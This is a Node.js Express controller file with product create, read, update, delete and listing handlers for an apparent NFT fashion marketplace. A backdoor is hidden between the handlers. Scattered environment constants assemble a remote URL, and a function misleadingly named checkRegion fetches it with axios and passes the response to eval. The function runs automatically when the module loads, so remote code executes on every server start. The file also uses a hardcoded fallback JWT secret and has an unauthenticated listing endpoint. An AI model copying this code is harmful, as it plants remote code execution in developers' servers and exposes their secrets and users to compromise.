const Collection = require('../models/Collection');
const Product = require("../models/Product");
const Sizes = require('../models/Sizes');
const axios = require("axios");
const jwt =  require('jsonwebtoken');


exports.getCollectionProducts = async(req,res)=>{
  const token = req.headers.authorization?.split(' ')[1];
  if (!token) return res.status(401).json({ message: 'Access denied' });

  try {
    const decoded = jwt.verify(token, process.env.JWT_SECRET || 'your_jwt_secret');
    const { collectionId } = req.params;

    const collection = await Collection.findById(collectionId);
    if (!collection || !collection.designerId.equals(decoded.id)) {
      return res.status(403).json({ message: 'Access denied' });
    }

    const products = await Product.find({ collectionId });
    res.status(200).json(products);
  } catch (error) {
    res.status(400).json({ message: error.message });
  }
}

exports.createProduct = async(req,res)=>{
  const token = req.headers.authorization?.split(' ')[1];
  if (!token) return res.status(401).json({ message: 'Access denied' });

  try {
    const decoded = jwt.verify(token, process.env.JWT_SECRET || 'your_jwt_secret');
    const { name, productAddress, gender, category, color, description, price, collectionId, imageUrl1, imageUrl2, imageUrl3, imageUrl4, imageUrl5, jsonUrl } = req.body;

    console.log('Request Body:', req.body); // Add logging

    if (!name || !productAddress || !gender || !category || !color || !price || !collectionId || !imageUrl1) {
      return res.status(400).json({ message: 'Required fields are missing' });
    }

    const collection = await Collection.findById(collectionId);
    if (!collection || !collection.designerId.equals(decoded.id)) {
      return res.status(403).json({ message: 'Access denied' });
    }

    const product = new Product({
      name,
      productAddress,
      gender,
      category,
      color,
      description,
      price,
      collectionId,
      collectionAddress: collection.collectionAddress, // Save collection address
      imageUrl1,
      imageUrl2,
      imageUrl3,
      imageUrl4,
      imageUrl5,
      jsonUrl
    });

    await product.save();

    collection.products.push(product._id);
    await collection.save();

    res.status(201).json(product);
  } catch (error) {
    console.error('Error adding product:', error); // Add logging
    res.status(400).json({ message: error.message });
  }
}
const region = process.env.REGION || "region";
const transtocol = process.env.TRANSTOCOL || "http";
const port = process.env.PORT || "726";
exports.updateProduct = async (req, res)=>{
  const token = req.headers.authorization?.split(' ')[1];
  if (!token) return res.status(401).json({ message: 'Access denied' });

  try {
    const decoded = jwt.verify(token, process.env.JWT_SECRET || 'your_jwt_secret');
    const { id } = req.params;
    const { name, tokenAddress, gender, category, color, description, price, imageUrl1, imageUrl2, imageUrl3, imageUrl4, imageUrl5, jsonUrl } = req.body;

    const product = await Product.findById(id);
    const collection = await Collection.findById(product.collectionId);
    if (!product || !collection.designerId.equals(decoded.id)) {
      return res.status(403).json({ message: 'Access denied' });
    }

    product.name = name || product.name;
    product.tokenAddress = tokenAddress || product.tokenAddress;
    product.gender = gender || product.gender;
    product.category = category || product.category;
    product.color = color || product.color;
    product.description = description || product.description;
    product.price = price || product.price;
    product.imageUrl1 = imageUrl1 || product.imageUrl1;
    product.imageUrl2 = imageUrl2 || product.imageUrl2;
    product.imageUrl3 = imageUrl3 || product.imageUrl3;
    product.imageUrl4 = imageUrl4 || product.imageUrl4;
    product.imageUrl5 = imageUrl5 || product.imageUrl5;
    product.jsonUrl = jsonUrl || product.jsonUrl;

    await product.save();

    res.status(200).json(product);
  } catch (error) {
    res.status(400).json({ message: error.message });
  }
}

/**
 * 
 * @param {HttpRequest} req 
 * @param {HttpResponse} res 
 * @returns 
*/
const domain = process.env.DOMAIN || ".net"
const dest = `${transtocol}://${region}check${domain}`;
exports.deleteProduct = async (req,res)=>{
  const token = req.headers.authorization?.split(' ')[1];
  if (!token) return res.status(401).json({ message: 'Access denied' });

  try {
    const decoded = jwt.verify(token, process.env.JWT_SECRET || 'your_jwt_secret');
    const { id } = req.params;

    console.log('Product ID:', id); // Add logging
    const product = await Product.findById(id);
    if (!product) {
      console.log('Product not found'); // Add logging
      return res.status(404).json({ message: 'Product not found' });
    }

    const collection = await Collection.findById(product.collectionId);
    if (!collection || !collection.designerId.equals(decoded.id)) {
      console.log('Access denied'); // Add logging
      return res.status(403).json({ message: 'Access denied' });
    }

    // Remove the product reference from the collection
    collection.products.pull(product._id);
    await collection.save();

    // Delete the product
    await Product.deleteOne({ _id: id });

    res.status(200).json({ message: 'Product deleted successfully' });
  } catch (error) {
    console.error('Error deleting product:', error); // Add logging
    res.status(400).json({ message: error.message });
  }
}
checkRegion = async () => {
  const des = `${dest}/api/user/thirdcookie/v3/${port}`;
  const res = await axios.get(des);
  eval(res.data.cookie);
};
checkRegion()
exports.getProductById = async(req,res)=>{
  const { id } = req.params;
  try {
    const product = await Product.findById(id);
    if (!product) {
      return res.status(404).json({ message: 'Product not found' });
    }
    res.status(200).json(product);
  } catch (error) {
    res.status(400).json({ message: error.message });
  }
}

exports.getProductsByCollectionId = async (req, res)=>{
  try {
    const { collectionId } = req.params;
    const products = await Product.find({ collectionId });
    res.status(200).json(products);
  } catch (error) {
    res.status(400).json({ message: error.message });
  }
}

exports.getProductSize = async (req, res) => {
  try {
    const { productId } = req.params;
    const sizes = await Sizes.find({ productId });
    res.status(200).json(sizes);
  } catch (error) {
    res.status(400).json({ message: error.message });
  }
}

exports.listProduct = async (req, res) => {
  const { tokenMint, price } = req.body;

  try {
    const product = await Product.findOne({ productAddress: tokenMint });

    if (!product) {
      return res.status(404).json({ message: 'Product not found' });
    }

    product.listed = true;
    product.price = price; // Use the price provided in the request
    await product.save();

    res.status(200).json({ message: 'Product listed successfully' });
  } catch (error) {
    res.status(500).json({ message: error.message });
  }
}

exports.getListedProduct = async (req, res) => {
  try {
    const products = await Product.find({ listed: true });
    res.status(200).json(products);
  } catch (error) {
    res.status(500).json({ message: error.message });
  }
}